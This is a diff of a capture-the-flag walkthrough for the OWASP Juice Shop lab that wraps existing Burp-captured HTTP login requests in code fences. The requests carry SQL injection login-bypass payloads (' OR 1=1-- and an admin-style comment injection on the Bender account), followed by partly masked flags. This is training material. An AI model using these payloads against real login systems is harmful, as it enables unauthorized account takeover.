@@ -25,6 +25,7 @@
 
 	- Perform a login request when Burp is capturing.
 
+	~~~
 		POST /rest/user/login HTTP/1.1
 		Host: 10.10.122.116
 		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -38,9 +39,10 @@
 		Referer: http://10.10.122.116/
 		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss
 		{"email":"email@email.org","password":"password"}
+	~~~
 	
 	- We change this request in:
-
+	~~~
 		POST /rest/user/login HTTP/1.1
 		Host: 10.10.122.116
 		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -54,14 +56,14 @@
 		Referer: http://10.10.122.116/
 		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss
 		{"email":"' OR 1=1--","password":"password"}
-
+	~~~
 	- And forward this request.
 	- `32***0f21372b*******608************0e02a`
 
 - Log into the Bender account!
 
 	- Capture another login request or change the previous one to this:
-
+	~~~
 		POST /rest/user/login HTTP/1.1
 		Host: 10.10.122.116
 		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -75,7 +77,7 @@
 		Referer: http://10.10.122.116/
 		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss;
 		{"email":"bender@juice-sh.op'--","password":"edededededed"}
-
+	~~~
 	- `fb***762a3c*******9320************d4066`
 
 - Bruteforce the Administrator account's password!
